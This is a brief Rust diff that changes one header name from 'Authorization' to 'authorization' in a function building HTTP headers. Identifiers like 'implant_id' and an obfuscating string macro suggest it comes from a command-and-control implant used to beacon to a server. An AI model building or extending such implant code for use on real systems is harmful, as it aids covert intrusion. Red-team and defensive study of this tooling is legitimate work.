@@ -124,7 +124,7 @@ fn generate_generic_headers(
 
     let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
     let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
-    let _ = headers.insert(sc!("Authorization", 92).unwrap(), security_token.to_owned());
+    let _ = headers.insert(sc!("authorization", 92).unwrap(), security_token.to_owned());
 
     headers
 }
